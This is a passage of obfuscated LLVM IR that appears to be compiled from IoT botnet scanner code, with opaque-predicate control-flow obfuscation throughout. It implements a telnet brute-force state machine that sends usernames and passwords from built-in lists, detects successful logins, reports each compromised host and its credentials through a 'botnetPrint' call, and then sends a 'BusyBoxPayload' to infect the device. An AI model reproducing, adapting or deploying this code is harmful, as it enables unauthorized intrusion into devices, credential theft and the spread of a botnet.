  br i1 %526, label %535, label %539

; <label>:535:                                    ; preds = %originalBBpart240
  %536 = load i32, i32* %5, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %537
  call void @advance_state(%struct.telstate_t* %538, i32 0)
  br label %543

; <label>:539:                                    ; preds = %originalBBpart240
  %540 = load i32, i32* %5, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %541
  call void @advance_state(%struct.telstate_t* %542, i32 3)
  br label %543

; <label>:543:                                    ; preds = %539, %535
  br label %1131

; <label>:544:                                    ; preds = %originalBBpart236
  %545 = load i32, i32* @x.75
  %546 = load i32, i32* @y.76
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %544
  %553 = load i32, i32* %5, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 7
  %557 = load i32, i32* %556, align 16
  %558 = add i32 %557, 7
  %559 = zext i32 %558 to i64
  %560 = call i64 @time(i64* null) #3
  %561 = icmp slt i64 %559, %560
  %562 = load i32, i32* @x.75
  %563 = load i32, i32* @y.76
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBBpart251, label %originalBB42alteredBB

originalBBpart251:                                ; preds = %originalBB42
  br i1 %561, label %570, label %590

; <label>:570:                                    ; preds = %originalBBpart251
  %571 = load i32, i32* @x.75
  %572 = load i32, i32* @y.76
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %570
  %579 = load i32, i32* %5, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %580
  call void @reset_telstate(%struct.telstate_t* %581)
  %582 = load i32, i32* @x.75
  %583 = load i32, i32* @y.76
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %590

; <label>:590:                                    ; preds = %originalBBpart255, %originalBBpart251
  br label %1130

; <label>:591:                                    ; preds = %originalBBpart212
  %592 = load i32, i32* @x.75
  %593 = load i32, i32* @y.76
  %594 = sub i32 %592, 1
  %595 = mul i32 %592, %594
  %596 = urem i32 %595, 2
  %597 = icmp eq i32 %596, 0
  %598 = icmp slt i32 %593, 10
  %599 = or i1 %597, %598
  br i1 %599, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %591
  %600 = load i32, i32* %5, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 0
  %604 = load i32, i32* %603, align 16
  %605 = load i32, i32* %5, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 4
  %609 = load i8, i8* %608, align 2
  %610 = zext i8 %609 to i64
  %611 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %610
  %612 = load i8*, i8** %611, align 8
  %613 = load i32, i32* %5, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 4
  %617 = load i8, i8* %616, align 2
  %618 = zext i8 %617 to i64
  %619 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %618
  %620 = load i8*, i8** %619, align 8
  %621 = call i64 @strlen(i8* %620) #9
  %622 = call i64 @send(i32 %604, i8* %612, i64 %621, i32 16384)
  %623 = icmp slt i64 %622, 0
  %624 = load i32, i32* @x.75
  %625 = load i32, i32* @y.76
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %623, label %632, label %636

; <label>:632:                                    ; preds = %originalBBpart259
  %633 = load i32, i32* %5, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %634
  call void @reset_telstate(%struct.telstate_t* %635)
  br label %1131

; <label>:636:                                    ; preds = %originalBBpart259
  %637 = load i32, i32* %5, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %638
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %639, i32 0, i32 0
  %641 = load i32, i32* %640, align 16
  %642 = call i64 @send(i32 %641, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.245, i32 0, i32 0), i64 2, i32 16384)
  %643 = icmp slt i64 %642, 0
  br i1 %643, label %644, label %648

; <label>:644:                                    ; preds = %636
  %645 = load i32, i32* %5, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %646
  call void @reset_telstate(%struct.telstate_t* %647)
  br label %1131

; <label>:648:                                    ; preds = %636
  %649 = load i32, i32* %5, align 4
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %650
  call void @advance_state(%struct.telstate_t* %651, i32 4)
  br label %1130

; <label>:652:                                    ; preds = %originalBBpart212
  %653 = load i32, i32* %5, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 0
  %657 = load i32, i32* %656, align 16
  %658 = load i32, i32* %3, align 4
  %659 = load i32, i32* %5, align 4
  %660 = sext i32 %659 to i64
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %660
  %662 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %661, i32 0, i32 9
  %663 = load i8*, i8** %662, align 8
  %664 = call i32 @read_until_response(i32 %657, i32 %658, i8* %663, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %665 = icmp ne i32 %664, 0
  br i1 %665, label %666, label %699

; <label>:666:                                    ; preds = %652
  %667 = load i32, i32* %5, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 9
  %671 = load i8*, i8** %670, align 8
  %672 = call i32 @contains_fail(i8* %671)
  %673 = icmp ne i32 %672, 0
  br i1 %673, label %674, label %678

; <label>:674:                                    ; preds = %666
  %675 = load i32, i32* %5, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %676
  call void @advance_state(%struct.telstate_t* %677, i32 0)
  br label %698

; <label>:678:                                    ; preds = %666
  %679 = load i32, i32* @x.75
  %680 = load i32, i32* @y.76
  %681 = sub i32 %679, 1
  %682 = mul i32 %679, %681
  %683 = urem i32 %682, 2
  %684 = icmp eq i32 %683, 0
  %685 = icmp slt i32 %680, 10
  %686 = or i1 %684, %685
  br i1 %686, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %678
  %687 = load i32, i32* %5, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %688
  call void @advance_state(%struct.telstate_t* %689, i32 5)
  %690 = load i32, i32* @x.75
  %691 = load i32, i32* @y.76
  %692 = sub i32 %690, 1
  %693 = mul i32 %690, %692
  %694 = urem i32 %693, 2
  %695 = icmp eq i32 %694, 0
  %696 = icmp slt i32 %691, 10
  %697 = or i1 %695, %696
  br i1 %697, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %698

; <label>:698:                                    ; preds = %originalBBpart263, %674
  br label %1131

; <label>:699:                                    ; preds = %652
  %700 = load i32, i32* @x.75
  %701 = load i32, i32* @y.76
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %699
  %708 = load i32, i32* %5, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 7
  %712 = load i32, i32* %711, align 16
  %713 = add i32 %712, 3
  %714 = zext i32 %713 to i64
  %715 = call i64 @time(i64* null) #3
  %716 = icmp slt i64 %714, %715
  %717 = load i32, i32* @x.75
  %718 = load i32, i32* @y.76
  %719 = sub i32 %717, 1
  %720 = mul i32 %717, %719
  %721 = urem i32 %720, 2
  %722 = icmp eq i32 %721, 0
  %723 = icmp slt i32 %718, 10
  %724 = or i1 %722, %723
  br i1 %724, label %originalBBpart273, label %originalBB65alteredBB

originalBBpart273:                                ; preds = %originalBB65
  br i1 %716, label %725, label %729

; <label>:725:                                    ; preds = %originalBBpart273
  %726 = load i32, i32* %5, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %727
  call void @reset_telstate(%struct.telstate_t* %728)
  br label %729

; <label>:729:                                    ; preds = %725, %originalBBpart273
  br label %1130

; <label>:730:                                    ; preds = %originalBBpart212
  %731 = load i32, i32* @x.75
  %732 = load i32, i32* @y.76
  %733 = sub i32 %731, 1
  %734 = mul i32 %731, %733
  %735 = urem i32 %734, 2
  %736 = icmp eq i32 %735, 0
  %737 = icmp slt i32 %732, 10
  %738 = or i1 %736, %737
  br i1 %738, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %730
  %739 = load i32, i32* %5, align 4
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 0
  %743 = load i32, i32* %742, align 16
  %744 = load i32, i32* %5, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %745
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %746, i32 0, i32 5
  %748 = load i8, i8* %747, align 1
  %749 = zext i8 %748 to i64
  %750 = getelementptr inbounds [4 x i8*], [4 x i8*]* @passwords, i64 0, i64 %749
  %751 = load i8*, i8** %750, align 8
  %752 = load i32, i32* %5, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 5
  %756 = load i8, i8* %755, align 1
  %757 = zext i8 %756 to i64
  %758 = getelementptr inbounds [4 x i8*], [4 x i8*]* @passwords, i64 0, i64 %757
  %759 = load i8*, i8** %758, align 8
  %760 = call i64 @strlen(i8* %759) #9
  %761 = call i64 @send(i32 %743, i8* %751, i64 %760, i32 16384)
  %762 = icmp slt i64 %761, 0
  %763 = load i32, i32* @x.75
  %764 = load i32, i32* @y.76
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %762, label %771, label %775

; <label>:771:                                    ; preds = %originalBBpart277
  %772 = load i32, i32* %5, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %773
  call void @reset_telstate(%struct.telstate_t* %774)
  br label %1131

; <label>:775:                                    ; preds = %originalBBpart277
  %776 = load i32, i32* %5, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 0
  %780 = load i32, i32* %779, align 16
  %781 = call i64 @send(i32 %780, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.245, i32 0, i32 0), i64 2, i32 16384)
  %782 = icmp slt i64 %781, 0
  br i1 %782, label %783, label %787

; <label>:783:                                    ; preds = %775
  %784 = load i32, i32* %5, align 4
  %785 = sext i32 %784 to i64
  %786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %785
  call void @reset_telstate(%struct.telstate_t* %786)
  br label %1131

; <label>:787:                                    ; preds = %775
  %788 = load i32, i32* %5, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %789
  call void @advance_state(%struct.telstate_t* %790, i32 6)
  br label %1130

; <label>:791:                                    ; preds = %originalBBpart212
  %792 = load i32, i32* %5, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %793
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %794, i32 0, i32 0
  %796 = load i32, i32* %795, align 16
  %797 = load i32, i32* %3, align 4
  %798 = load i32, i32* %5, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %799
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %800, i32 0, i32 9
  %802 = load i8*, i8** %801, align 8
  %803 = call i32 @read_until_response(i32 %796, i32 %797, i8* %802, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %804 = icmp ne i32 %803, 0
  br i1 %804, label %805, label %940

; <label>:805:                                    ; preds = %791
  %806 = call i64 @time(i64* null) #3
  %807 = trunc i64 %806 to i32
  %808 = load i32, i32* %5, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 7
  store i32 %807, i32* %811, align 16
  %812 = load i32, i32* %5, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 9
  %816 = load i8*, i8** %815, align 8
  %817 = call i32 @contains_fail(i8* %816)
  %818 = icmp ne i32 %817, 0
  br i1 %818, label %819, label %823

; <label>:819:                                    ; preds = %805
  %820 = load i32, i32* %5, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %821
  call void @advance_state(%struct.telstate_t* %822, i32 0)
  br label %939

; <label>:823:                                    ; preds = %805
  %824 = load i32, i32* %5, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 9
  %828 = load i8*, i8** %827, align 8
  %829 = call i32 @contains_success(i8* %828)
  %830 = icmp ne i32 %829, 0
  br i1 %830, label %831, label %934

; <label>:831:                                    ; preds = %823
  %832 = load i32, i32* @x.75
  %833 = load i32, i32* @y.76
  %834 = sub i32 %832, 1
  %835 = mul i32 %832, %834
  %836 = urem i32 %835, 2
  %837 = icmp eq i32 %836, 0
  %838 = icmp slt i32 %833, 10
  %839 = or i1 %837, %838
  br i1 %839, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %831
  %840 = load i32, i32* %5, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 3
  %844 = load i8, i8* %843, align 1
  %845 = zext i8 %844 to i32
  %846 = icmp eq i32 %845, 2
  %847 = load i32, i32* @x.75
  %848 = load i32, i32* @y.76
  %849 = sub i32 %847, 1
  %850 = mul i32 %847, %849
  %851 = urem i32 %850, 2
  %852 = icmp eq i32 %851, 0
  %853 = icmp slt i32 %848, 10
  %854 = or i1 %852, %853
  br i1 %854, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %846, label %855, label %875

; <label>:855:                                    ; preds = %originalBBpart281
  %856 = load i32, i32* @x.75
  %857 = load i32, i32* @y.76
  %858 = sub i32 %856, 1
  %859 = mul i32 %856, %858
  %860 = urem i32 %859, 2
  %861 = icmp eq i32 %860, 0
  %862 = icmp slt i32 %857, 10
  %863 = or i1 %861, %862
  br i1 %863, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %855
  %864 = load i32, i32* %5, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %865
  call void @advance_state(%struct.telstate_t* %866, i32 7)
  %867 = load i32, i32* @x.75
  %868 = load i32, i32* @y.76
  %869 = sub i32 %867, 1
  %870 = mul i32 %867, %869
  %871 = urem i32 %870, 2
  %872 = icmp eq i32 %871, 0
  %873 = icmp slt i32 %868, 10
  %874 = or i1 %872, %873
  br i1 %874, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %917

; <label>:875:                                    ; preds = %originalBBpart281
  %876 = load i32, i32* @x.75
  %877 = load i32, i32* @y.76
  %878 = sub i32 %876, 1
  %879 = mul i32 %876, %878
  %880 = urem i32 %879, 2
  %881 = icmp eq i32 %880, 0
  %882 = icmp slt i32 %877, 10
  %883 = or i1 %881, %882
  br i1 %883, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %875
  %884 = load i32, i32* @KadenCommStock, align 4
  %885 = load i32, i32* %5, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %886
  %888 = call i8* @get_telstate_host(%struct.telstate_t* %887)
  %889 = load i32, i32* %5, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 4
  %893 = load i8, i8* %892, align 2
  %894 = zext i8 %893 to i64
  %895 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %894
  %896 = load i8*, i8** %895, align 8
  %897 = load i32, i32* %5, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %898
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %899, i32 0, i32 5
  %901 = load i8, i8* %900, align 1
  %902 = zext i8 %901 to i64
  %903 = getelementptr inbounds [4 x i8*], [4 x i8*]* @passwords, i64 0, i64 %902
  %904 = load i8*, i8** %903, align 8
  %905 = call i32 (i32, i8*, ...) @botnetPrint(i32 %884, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.246, i32 0, i32 0), i8* %888, i8* %896, i8* %904)
  %906 = load i32, i32* %5, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %907
  call void @advance_state(%struct.telstate_t* %908, i32 7)
  %909 = load i32, i32* @x.75
  %910 = load i32, i32* @y.76
  %911 = sub i32 %909, 1
  %912 = mul i32 %909, %911
  %913 = urem i32 %912, 2
  %914 = icmp eq i32 %913, 0
  %915 = icmp slt i32 %910, 10
  %916 = or i1 %914, %915
  br i1 %916, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %917

; <label>:917:                                    ; preds = %originalBBpart289, %originalBBpart285
  %918 = load i32, i32* @x.75
  %919 = load i32, i32* @y.76
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %917
  %926 = load i32, i32* @x.75
  %927 = load i32, i32* @y.76
  %928 = sub i32 %926, 1
  %929 = mul i32 %926, %928
  %930 = urem i32 %929, 2
  %931 = icmp eq i32 %930, 0
  %932 = icmp slt i32 %927, 10
  %933 = or i1 %931, %932
  br i1 %933, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %938

; <label>:934:                                    ; preds = %823
  %935 = load i32, i32* %5, align 4
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %936
  call void @reset_telstate(%struct.telstate_t* %937)
  br label %938

; <label>:938:                                    ; preds = %934, %originalBBpart293
  br label %939

; <label>:939:                                    ; preds = %938, %819
  br label %1131

; <label>:940:                                    ; preds = %791
  %941 = load i32, i32* @x.75
  %942 = load i32, i32* @y.76
  %943 = sub i32 %941, 1
  %944 = mul i32 %941, %943
  %945 = urem i32 %944, 2
  %946 = icmp eq i32 %945, 0
  %947 = icmp slt i32 %942, 10
  %948 = or i1 %946, %947
  br i1 %948, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %940
  %949 = load i32, i32* %5, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 7
  %953 = load i32, i32* %952, align 16
  %954 = add i32 %953, 7
  %955 = zext i32 %954 to i64
  %956 = call i64 @time(i64* null) #3
  %957 = icmp slt i64 %955, %956
  %958 = load i32, i32* @x.75
  %959 = load i32, i32* @y.76
  %960 = sub i32 %958, 1
  %961 = mul i32 %958, %960
  %962 = urem i32 %961, 2
  %963 = icmp eq i32 %962, 0
  %964 = icmp slt i32 %959, 10
  %965 = or i1 %963, %964
  br i1 %965, label %originalBBpart2104, label %originalBB95alteredBB

originalBBpart2104:                               ; preds = %originalBB95
  br i1 %957, label %966, label %986

; <label>:966:                                    ; preds = %originalBBpart2104
  %967 = load i32, i32* @x.75
  %968 = load i32, i32* @y.76
  %969 = sub i32 %967, 1
  %970 = mul i32 %967, %969
  %971 = urem i32 %970, 2
  %972 = icmp eq i32 %971, 0
  %973 = icmp slt i32 %968, 10
  %974 = or i1 %972, %973
  br i1 %974, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %966
  %975 = load i32, i32* %5, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %976
  call void @reset_telstate(%struct.telstate_t* %977)
  %978 = load i32, i32* @x.75
  %979 = load i32, i32* @y.76
  %980 = sub i32 %978, 1
  %981 = mul i32 %978, %980
  %982 = urem i32 %981, 2
  %983 = icmp eq i32 %982, 0
  %984 = icmp slt i32 %979, 10
  %985 = or i1 %983, %984
  br i1 %985, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %986

; <label>:986:                                    ; preds = %originalBBpart2108, %originalBBpart2104
  %987 = load i32, i32* @x.75
  %988 = load i32, i32* @y.76
  %989 = sub i32 %987, 1
  %990 = mul i32 %987, %989
  %991 = urem i32 %990, 2
  %992 = icmp eq i32 %991, 0
  %993 = icmp slt i32 %988, 10
  %994 = or i1 %992, %993
  br i1 %994, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %986
  %995 = load i32, i32* @x.75
  %996 = load i32, i32* @y.76
  %997 = sub i32 %995, 1
  %998 = mul i32 %995, %997
  %999 = urem i32 %998, 2
  %1000 = icmp eq i32 %999, 0
  %1001 = icmp slt i32 %996, 10
  %1002 = or i1 %1000, %1001
  br i1 %1002, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %1130

; <label>:1003:                                   ; preds = %originalBBpart212
  %1004 = load i32, i32* @x.75
  %1005 = load i32, i32* @y.76
  %1006 = sub i32 %1004, 1
  %1007 = mul i32 %1004, %1006
  %1008 = urem i32 %1007, 2
  %1009 = icmp eq i32 %1008, 0
  %1010 = icmp slt i32 %1005, 10
  %1011 = or i1 %1009, %1010
  br i1 %1011, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %1003
  %1012 = call i64 @time(i64* null) #3
  %1013 = trunc i64 %1012 to i32
  %1014 = load i32, i32* %5, align 4
  %1015 = sext i32 %1014 to i64
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1015
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1016, i32 0, i32 7
  store i32 %1013, i32* %1017, align 16
  %1018 = load i32, i32* %5, align 4
  %1019 = sext i32 %1018 to i64
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1019
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1020, i32 0, i32 0
  %1022 = load i32, i32* %1021, align 16
  %1023 = call i64 @send(i32 %1022, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.247, i32 0, i32 0), i64 4, i32 16384)
  %1024 = icmp slt i64 %1023, 0
  %1025 = load i32, i32* @x.75
  %1026 = load i32, i32* @y.76
  %1027 = sub i32 %1025, 1
  %1028 = mul i32 %1025, %1027
  %1029 = urem i32 %1028, 2
  %1030 = icmp eq i32 %1029, 0
  %1031 = icmp slt i32 %1026, 10
  %1032 = or i1 %1030, %1031
  br i1 %1032, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %1024, label %1033, label %1050

; <label>:1033:                                   ; preds = %originalBBpart2116
  %1034 = load i32, i32* @x.75
  %1035 = load i32, i32* @y.76
  %1036 = sub i32 %1034, 1
  %1037 = mul i32 %1034, %1036
  %1038 = urem i32 %1037, 2
  %1039 = icmp eq i32 %1038, 0
  %1040 = icmp slt i32 %1035, 10
  %1041 = or i1 %1039, %1040
  br i1 %1041, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1033
  %1042 = load i32, i32* @x.75
  %1043 = load i32, i32* @y.76
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1050

; <label>:1050:                                   ; preds = %originalBBpart2120, %originalBBpart2116
  %1051 = load i32, i32* %5, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 0
  %1055 = load i32, i32* %1054, align 16
  %1056 = call i64 @send(i32 %1055, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.248, i32 0, i32 0), i64 7, i32 16384)
  %1057 = icmp slt i64 %1056, 0
  br i1 %1057, label %1058, label %1059

; <label>:1058:                                   ; preds = %1050
  br label %1059

; <label>:1059:                                   ; preds = %1058, %1050
  %1060 = load i32, i32* %5, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 0
  %1064 = load i32, i32* %1063, align 16
  %1065 = load i8*, i8** @BusyBoxPayload, align 8
  %1066 = load i8*, i8** @BusyBoxPayload, align 8
  %1067 = call i64 @strlen(i8* %1066) #9
  %1068 = call i64 @send(i32 %1064, i8* %1065, i64 %1067, i32 16384)
  %1069 = icmp slt i64 %1068, 0
  br i1 %1069, label %1070, label %1074

; <label>:1070:                                   ; preds = %1059
